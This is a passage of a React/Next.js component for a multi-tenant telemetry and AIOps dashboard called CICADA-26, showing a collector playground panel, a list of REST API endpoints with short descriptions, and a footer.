                  fontSize: '0.8rem',
                  resize: 'vertical',
                  outline: 'none',
                }}
              />
              <button
                onClick={handlePlaygroundSubmit}
                disabled={playgroundRunning}
                style={{
                  marginTop: '10px',
                  background: 'linear-gradient(135deg, #00f0ff, #3b82f6)',
                  border: 'none',
                  color: '#07090e',
                  fontWeight: '700',
                  borderRadius: '6px',
                  padding: '10px 20px',
                  fontSize: '0.85rem',
                  cursor: 'pointer',
                }}
              >
                {playgroundRunning ? 'Sanitizing & Processing...' : 'Send to Local Collector'}
              </button>
            </div>

            {/* Output Inspector */}
            <div>
              <label style={{ fontSize: '0.75rem', fontWeight: '700', color: 'var(--text-dim)', textTransform: 'uppercase' }}>
                Collector Output (Metadata Only):
              </label>
              <pre style={{
                marginTop: '6px',
                background: '#04060a',
                border: `1px solid ${playgroundResult?.httpStatus === 403 ? 'var(--accent-rose)' : 'var(--border-subtle)'}`,
                borderRadius: '8px',
                padding: '12px',
                color: playgroundResult?.httpStatus === 403 ? '#fca5a5' : '#a5f3fc',
                fontSize: '0.8rem',
                minHeight: '280px',
                maxHeight: '400px',
                overflowY: 'auto',
                whiteSpace: 'pre-wrap',
              }}>
                {playgroundResult ? JSON.stringify(playgroundResult, null, 2) : '// Click "Send to Local Collector" to view sanitized output'}
              </pre>
            </div>
          </div>
        </div>
      )}

      {/* Tab 4: API Architecture */}
      {activeTab === 'api' && (
        <div style={{
          background: 'var(--bg-card)',
          border: '1px solid var(--border-subtle)',
          borderRadius: '12px',
          padding: '24px',
        }}>
          <h3 style={{ fontSize: '1rem', fontWeight: '700', marginBottom: '16px' }}>
            🔌 Platform REST API Specification
          </h3>

          <div style={{ display: 'flex', flexDirection: 'column', gap: '12px' }}>
            {[
              { method: 'POST', endpoint: '/api/collector', desc: 'Local collector: raw data filtering, DLP leak prevention, attack shield, and metadata forwarding.' },
              { method: 'GET', endpoint: '/api/collector', desc: 'Collector telemetry health and real-time security attack & leak audit statistics.' },
              { method: 'GET', endpoint: '/api/aiops?tenantId={id}', desc: 'Full AIOps operational intelligence: health scores, anomaly baselines, incident clusters, RCA, runbooks.' },
              { method: 'POST', endpoint: '/api/simulate', desc: 'Runs simulated telemetry scenarios ("spikes", "outages", "failed_logins") into SQLite database with integrated AI.' },
              { method: 'GET', endpoint: '/api/database?tenantId={id}&resource=...', desc: 'Direct multi-tenant SQLite database query for events, incidents, anomalies, and attacks.' },
              { method: 'GET', endpoint: '/api/telemetry?tenantId={id}&includeAiops=true', desc: 'Core telemetry engine query with optional AIOps health score enrichment.' },
              { method: 'POST', endpoint: '/api/ingest', desc: 'Upstream collector ingestion endpoint with token authorization and chronological timeline healing.' },
            ].map((api, idx) => (
              <div key={idx} style={{
                background: 'var(--bg-secondary)',
                border: '1px solid var(--border-subtle)',
                borderRadius: '8px',
                padding: '12px 16px',
                display: 'flex',
                alignItems: 'center',
                gap: '12px',
              }}>
                <span style={{
                  padding: '3px 8px',
                  borderRadius: '4px',
                  fontSize: '0.72rem',
                  fontWeight: '700',
                  background: api.method === 'POST' ? 'rgba(59, 130, 246, 0.2)' : 'rgba(16, 185, 129, 0.2)',
                  color: api.method === 'POST' ? '#60a5fa' : '#34d399',
                }}>
                  {api.method}
                </span>
                <code style={{ fontSize: '0.82rem', color: 'var(--accent-cyan)', fontWeight: '600' }}>
                  {api.endpoint}
                </code>
                <span style={{ fontSize: '0.8rem', color: 'var(--text-muted)', marginLeft: 'auto' }}>
                  {api.desc}
                </span>
              </div>
            ))}
          </div>
        </div>
      )}

      {/* Footer */}
      <footer style={{
        marginTop: '40px',
        paddingTop: '20px',
        borderTop: '1px solid var(--border-subtle)',
        display: 'flex',
        flexWrap: 'wrap',
        justifyContent: 'space-between',
        alignItems: 'center',
        fontSize: '0.75rem',
        color: 'var(--text-dim)',
        gap: '12px',
      }}>
        <div>
          CICADA-26 // Enterprise Multi-Tenant Telemetry & Built-in AIOps Platform
        </div>
        <div>
          Storage: <strong>SQLite (node:sqlite)</strong> | Engine: <strong>Next.js 14 App Router</strong>
        </div>
      </footer>
    </div>
  );
}
